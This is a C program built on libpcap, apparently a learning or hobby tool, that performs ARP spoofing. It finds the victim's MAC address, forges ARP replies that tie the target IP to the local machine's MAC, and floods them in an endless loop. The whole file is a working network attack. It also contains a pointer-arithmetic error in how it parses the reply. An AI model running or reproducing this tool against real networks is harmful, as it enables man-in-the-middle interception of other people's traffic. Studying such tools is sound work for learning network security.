#include <pcap.h>
#include <stdio.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pcap/pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>

int main(int argc, char *argv[]) {

	u_char fake_packet[42];
	u_char arp_req[42];
	const u_char *arp_rep;
	char errbuf[PCAP_ERRBUF_SIZE];
	char *dev, *sip, *tip, mip[20], mac[6], sendmac[6];
	struct ether_header *ethh;
	struct ether_arp *arph;
	struct in_addr sipn, tipn, ipn;
	struct pcap_pkthdr header;
	struct sockaddr_in *sin;
	struct ifreq ifr;
	pcap_t *handle;
	u_char mipn[4];
	int i, s;

	if (argc != 4) {
		printf("Fail\n");
		return -1;
	}

	dev = argv[1];
	sip = argv[2];
	tip = argv[3];
	inet_aton(sip, &sipn);
	inet_aton(tip, &tipn);

	/* My Macaddress and IP*/
	s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) perror("socket fail");
	strncpy(ifr.ifr_name, (const char *)dev, IFNAMSIZ);
	if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0)
		perror("ioctl fail");
	memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
	if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
		perror("ioctl fail");
	sin = (struct sockaddr_in *)&ifr.ifr_addr;
	memcpy(mipn, (void *)&sin->sin_addr, sizeof(sin->sin_addr));
	sprintf(mip, "%d.%d.%d.%d", (int)mipn[0], (int)mipn[1], (int)mipn[2], (int)mipn[3]);
	inet_aton(mip, &ipn);
	close(s);


	/*normal packet making*/
	bzero(arp_req, sizeof(arp_req));
	ethh = (struct ether_header *)arp_req;
	arph = (struct ether_arp *)(arp_req + 14);
	memset(ethh->ether_dhost, 0xff, 6);
	memcpy(ethh->ether_shost, mac, 6);
	ethh->ether_type = htons(ETH_P_ARP);
	arph->ea_hdr.ar_hrd = htons(0x0001);
	arph->ea_hdr.ar_pro = htons(ETH_P_IP);
	arph->ea_hdr.ar_hln = 0x06;
	arph->ea_hdr.ar_pln = 0x04;
	arph->ea_hdr.ar_op = htons(0x0001);
	memcpy(arph->arp_sha, mac, 6);
	memcpy(arph->arp_spa, &ipn.s_addr, 4);
	memset(arph->arp_tha, 0x00, 6);
	memcpy(arph->arp_tpa, &sipn.s_addr, 4);

	/*sendmac capture*/ 
   handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if (handle == NULL) {
	   fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
           return(2);
    }
   
	while(1){
		pcap_sendpacket(handle,arp_req,42);
		   arp_rep = pcap_next(handle,&header);
		   ethh = (struct ether_header *)arp_rep;
		   arph = (struct ether_arp *)arp_rep+14;
		   if(ntohs(ethh->ether_type) == ETHERTYPE_ARP){
		   memcpy(sendmac,arph->arp_sha,6);
			   break;
	       }
		else{ printf("NO\n");}
	}

     /*fake_packet making*/
      bzero(fake_packet, sizeof(fake_packet));
      ethh = (struct ether_header *)fake_packet;
      arph = (struct ether_arp *)(fake_packet + 14);
      memcpy(ethh->ether_dhost, sendmac, 6);
      memcpy(ethh->ether_shost, mac, 6);
      ethh->ether_type = htons(ETH_P_ARP);
      arph->ea_hdr.ar_hrd = htons(0x0001);
      arph->ea_hdr.ar_pro = htons(ETH_P_IP);
      arph->ea_hdr.ar_hln = 0x06;
      arph->ea_hdr.ar_pln = 0x04;
      arph->ea_hdr.ar_op = htons(0x0002);
      memcpy(arph->arp_sha, mac, 6);
      memcpy(arph->arp_spa, &tipn.s_addr, 4);
      memcpy(arph->arp_tha, sendmac, 6);
      memcpy(arph->arp_tpa, &sipn.s_addr, 4);


	  printf("ARP SPOOFING...\n");
	  /*ARP Spoofing*/
	 while(1){
			pcap_sendpacket(handle,fake_packet,42);
	 }
	 pcap_close(handle);
	 return 0;
 }
